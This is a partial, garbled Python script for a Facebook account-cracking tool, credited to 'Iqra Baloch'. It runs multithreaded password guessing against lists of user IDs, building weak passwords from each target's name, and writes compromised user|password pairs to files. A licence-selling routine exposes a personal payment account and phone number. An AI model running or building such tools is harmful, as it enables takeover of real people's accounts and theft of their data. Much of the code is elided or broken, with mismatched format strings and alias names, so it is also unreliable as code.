...
from concurrent.futures import ThreadPoolExecutor as iqra
...
logo =                                          """   
   ...
   \033[1;37m ######      ######     ########  
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Iqra Baloch
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m       Iqra Baloch
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Iqra Is Here
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97IQRA_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97IQRA_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back IQRA Menu ")
	    iqra()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[iqra] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [IQRA-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('IQRA_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with Iqra(max_workers=30) as ssbworld:
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        iqraworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\reasypaisa Account Number 03473638852\n')
        print('\rAccount Name Samillah\n')
        print
        print
        ...
        os.system('am start https://wa.me/+923473638852?text=' + tks)
...
def bnsreg():
    ...
    print
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~Iqra=="
    print
